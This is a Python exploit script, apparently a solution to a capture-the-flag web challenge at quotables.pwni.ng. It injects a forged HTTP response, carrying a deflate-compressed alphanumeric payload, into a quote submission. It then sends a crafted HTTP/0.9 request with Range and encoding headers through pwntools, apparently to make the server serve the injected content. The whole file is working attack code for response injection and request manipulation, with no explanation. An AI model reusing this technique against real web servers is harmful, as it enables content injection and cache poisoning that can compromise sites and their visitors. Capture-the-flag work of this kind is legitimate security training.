# -*- coding: utf-8 -*-


import requests

from pwn import *

import zlib


headers = {
    'Origin': 'http://quotables.pwni.ng:1337',
    'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
}


# using ascii-zip
wow = 'D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4'


data = {
  'quote': 'HTTP/1.0 200 OK\r\nHTTP/1.0 302 OK\r\nContent-Encoding: deflate\r\nContent-Type: text/html;\r\nContent-Lexngth: {length}\r\n\r\n'.format(length=len(wow)) + wow,
  'attribution': ''
}

response = requests.post('http://quotables.pwni.ng:1337/quotes/new', headers=headers, data=data)
# response = requests.post('http://quotables.pwni.ng:1337/quotes/new', headers=headers, files=files)
key = response.history[0].headers['Location'].split('quote#')[1]

from pwn import *

r = remote('quotables.pwni.ng', 1337)
r.sendline('''GET /api/quote/{target} HTTP/0.9
Connection: keep-alive
Host: quotables.pwni.ng:1337
Range: bytes=0-2
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Content-Transfer-Encoding: BASE64
Accept-Charset: iso-8859-15
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Proxy-Connection: close

'''.replace('\n', '\r\n').format(target=key))

r.close()

url = 'http://quotables.pwni.ng:1337/api/quote/' + key

print '-'*20
print url

c = requests.post(url)
# print c.content.encode('hex')

qwer = c.content.split('\r\n\r\n')[1]
print qwer.encode('hex')
# print brotli.decompress(qwer)[:-3]


c = requests.get(url)
print c.text
